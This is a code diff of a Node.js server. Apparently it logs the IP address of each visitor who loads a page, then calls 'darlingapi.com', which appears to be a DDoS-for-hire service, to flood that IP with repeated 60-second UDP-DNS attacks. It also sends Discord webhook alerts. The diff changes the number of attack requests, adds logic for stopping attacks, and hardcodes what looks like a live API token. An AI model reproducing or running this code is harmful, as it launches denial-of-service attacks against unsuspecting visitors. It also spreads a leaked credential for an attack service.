@@ -67,9 +67,9 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
-    const requests = Array(6).fill(url).map(u => axios.get(u));
+    const requests = Array(5).fill(url).map(u => axios.get(u));
     const url2 = `https://darlingapi.com?token=${token2}&host=${ip}&port=0&time=60&method=UDP-DNS`;
-    const requests2 = Array(12).fill(url2).map(u => axios.get(u))
+    const requests2 = Array(6).fill(url2).map(u => axios.get(u))
     
     try {
         await axios.all(requests, requests2);
@@ -81,19 +81,22 @@ async function sendApiRequest(ip) {
 
 async function verificar() {
     try {
-        const response = await axios.get(`https://darlingapi.com/status?token=${token}`);
+        const response = await axios.get(`https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff`);
         const data = response.data;
 
+        const expires = data.attacks.map(attack => attack.expire)
+
         if (data.account.running > 0) {
-            const url = `https://darlingapi.com/stop_all?token=${token}`;
-            await axios.get(url);
-            console.log('Ataques anteriores interrompidos');
+            if(expires.some(expire => expire <= 30)){
+                const url = `https://darlingapi.com/stop_all?token=${token}`;
+                await axios.get(url);
+                console.log('Ataques anteriores interrompidos');
+            }
         }
     } catch (error) {
         console.error('Erro ao verificar o status dos ataques:', error);
     }
 }
-
 async function sendDiscordWebhooks(ip) {
     const webhook2 = axios.post(discordWebhookUrl, {
         embeds: [{
@@ -137,6 +140,7 @@ app.post('/page-loaded', async (req, res) => {
         if (!ipEntry) {
             visitorsCache.push({ ip, timestamp });
             await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
+            await verificar()
         }
 
         //await verificar();
